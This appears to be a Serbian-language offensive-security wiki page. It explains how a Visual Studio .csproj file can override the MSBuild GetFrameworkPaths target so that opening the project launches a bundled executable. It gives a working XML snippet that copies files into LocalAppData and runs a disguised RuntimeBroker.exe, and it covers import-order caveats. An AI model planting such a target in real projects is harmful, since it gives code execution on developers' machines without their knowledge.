# Izvršavanje MSBuild-a u vreme projektovanja Visual Studio projekta

{{#include ../banners/hacktricks-training.md}}

Otvaranje C# projekta u Visual Studio-u nije pasivno čitanje. Njegova međuizgradnja u vreme projektovanja poziva imenovane MSBuild ciljeve radi inicijalizacije IntelliSense-a, referenci i otklanjanja grešaka **pre nego što** programer izabere Build ili Run. `GetFrameworkPaths` je jedan od tih ciljeva. Projekat koji ga redefiniše može da pretvori učitavanje projekta u izvršavanje koda u kontekstu korisnika, bez zasebnog klika na payload.<sup>[[1]](#references)[[2]](#references)</sup>

Prijavljeni projekat je deklarisao datoteke resursa, a zatim koristio `MakeDir`, `Copy` i `Exec` unutar zamenjenog cilja da pripremi i pokrene payload koji se nalazi u istom direktorijumu. Ovaj skraćeni izvod čuva putanju izvršavanja prikazanu na slici 6 u izvornom tekstu; treba da se nalazi u `.csproj` datoteci, a ne u samostalnoj XML datoteci.<sup>[[1]](#references)</sup>

```xml
<ItemGroup>
  <ResourceFiles Include="Resources\**\*.*" />
</ItemGroup>
<Target Name="GetFrameworkPaths">
  <MakeDir Directories="$(LocalAppData)\Microsoft\RuntimeBrokers" />
  <Copy SourceFiles="@(ResourceFiles)"
        DestinationFolder="$(LocalAppData)\Microsoft\RuntimeBrokers\%(RecursiveDir)"
        SkipUnchangedFiles="true" />
  <Exec Command='start "" "$(LocalAppData)\Microsoft\RuntimeBrokers\RuntimeBroker.exe"' />
</Target>
```

**Redosled uvoza je važan:** MSBuild koristi *poslednju* definiciju target-a. Nije zagarantovano da će target definisan u projektnoj datoteci zameniti Microsoft-ov target ako ga kasniji import ponovo definiše. Projekti u SDK stilu koji koriste `<Project Sdk="...">` implicitno importuju SDK target-e nakon tela projekta, zato proverite evaluirani redosled uvoza umesto da pretpostavite da ovo tačno prepisivanje funkcioniše u svakom projektu. `MSBuild.exe -preprocess:expanded.xml project.csproj` proširuje importe bez izgradnje projekta i može pomoći da pronađete efektivnu definiciju target-a.<sup>[[3]](#references)[[4]](#references)</sup>

Ovo je površina za izvršavanje developerskih projekata, a ne instalacija VSIX ekstenzije, i samo po sebi ne predstavlja eskalaciju privilegija. Ako pripremljena izvršna datoteka koristi zlonamerni susedni `.exe.config` ili DLL, nastavite sa [AppDomainManager hijacking and DLL sideloading](windows-local-privilege-escalation/dll-hijacking/).

## References

- [1] [Unit 42 - Kampanja Blinder Tunnel cilja iračku infrastrukturu](https://unit42.paloaltonetworks.com/blinder-tunnel-targets-critical-infrastructure/)
- [2] [Microsoft Learn - Integracija Visual Studio (MSBuild)](https://learn.microsoft.com/en-us/visualstudio/msbuild/visual-studio-integration-msbuild?view=visualstudio)
- [3] [Microsoft Learn - MSBuild target-i](https://learn.microsoft.com/en-us/visualstudio/msbuild/msbuild-targets)
- [4] [Microsoft Learn - Referenca za komandnu liniju MSBuild-a](https://learn.microsoft.com/en-us/visualstudio/msbuild/msbuild-command-line-reference?view=visualstudio)
{{#include ../banners/hacktricks-training.md}}
